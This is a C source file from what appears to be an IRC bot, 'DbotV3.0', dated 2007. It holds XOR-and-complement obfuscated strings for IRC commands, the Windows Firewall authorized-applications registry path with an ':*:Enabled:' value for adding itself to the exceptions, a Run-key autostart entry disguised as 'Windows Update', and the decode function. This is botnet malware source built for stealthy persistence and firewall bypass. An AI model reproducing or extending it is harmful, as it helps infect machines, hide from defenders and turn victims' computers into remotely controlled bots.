/*
	XOR Encoded strings
	by D (c) 2007

	Read manuals before you change anything here!
*/

// NICK
char string_nick[] = "\xB8\xBF\xB5\xBD\x00";

// JOIN
char string_join[] = "\xBC\xB9\xBF\xB8\x00";

// PART
char string_part[] = "\xA6\xB7\xA4\xA2\x00";

// QUIT
char string_quit[] = "\xA7\xA3\xBF\xA2\x00";

// PRIVMSG
char string_privmsg[] = "\xA6\xA4\xBF\xA0\xBB\xA5\xB1\x00";

// PASS
char string_pass[] = "\xA6\xB7\xA5\xA5\x00";

// PING
char string_ping[] = "\xA6\xBF\xB8\xB1\x00";

// PONG
char string_pong[] = "\xA6\xB9\xB8\xB1\x00";

// USER
char string_user[] = "\xA3\xA5\xB3\xA4\x00";

// MODE
char string_mode[] = "\xBB\xB9\xB2\xB3\x00";

// SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile\\AuthorizedApplications\\List
char string_firewall_location[] = "\xA5\xAF\xA5\xA2\xB3\xBB\xAA\xAA\xB5\x83\x84\x84\x93\x98\x82\xB5"
										   "\x99\x98\x82\x84\x99\x9A\xA5\x93\x82\xAA\xAA\xA5\x93\x84\x80\x9F"
										   "\x95\x93\x85\xAA\xAA\xA5\x9E\x97\x84\x93\x92\xB7\x95\x95\x93\x85"
										   "\x85\xAA\xAA\xA6\x97\x84\x97\x9B\x93\x82\x93\x84\x85\xAA\xAA\xB0"
										   "\x9F\x84\x93\x81\x97\x9A\x9A\xA6\x99\x9A\x9F\x95\x8F\xAA\xAA\xA5"
										   "\x82\x97\x98\x92\x97\x84\x92\xA6\x84\x99\x90\x9F\x9A\x93\xAA\xAA"
										   "\xB7\x83\x82\x9E\x99\x84\x9F\x8C\x93\x92\xB7\x86\x86\x9A\x9F\x95"
										   "\x97\x82\x9F\x99\x98\x85\xAA\xAA\xBA\x9F\x85\x82\x00";
// :*:Enabled:
char string_firewall_enabled[] = "\xCC\xDC\xCC\xB3\x98\x97\x94\x9A\x93\x92\xCC\x00";

// Software\\Microsoft\\Windows\\CurrentVersion\\Run
char string_autostart_location[] = "\xA5\x99\x90\x82\x81\x97\x84\x93\xAA\xAA\xBB\x9F\x95\x84\x99\x85"
											"\x99\x90\x82\xAA\xAA\xA1\x9F\x98\x92\x99\x81\x85\xAA\xAA\xB5\x83"
											"\x84\x84\x93\x98\x82\xA0\x93\x84\x85\x9F\x99\x98\xAA\xAA\xA4\x83"
											"\x98\x00";

// Windows Update
char string_autostart_description[] = "\xA1\x9F\x98\x92\x99\x81\x85\xD6\xA3\x86\x92\x97\x82\x93\x00";

// DbotV3.0
char string_botversion[] = "\xB2\x94\x99\x82\xA0\xC5\xD8\xC6\x00";

// key for decoding strings
char decode_key[] = "uizh2984";

// using complement for decoding
BOOL decode_comp = TRUE;

// function for decoding strings
char *Decode(char *s)
{
	unsigned int i, j;
	char *string;

	string = (char *) malloc (strlen(s)+1);

	strcpy(string, s);

	for (i = 0; i < strlen(string); i++)
	{
		for (j = 0; j < sizeof(decode_key); j++)
			string[i] ^= decode_key[j];

		if (decode_comp)
			string[i] = ~ string[i];
	}

	return string;
}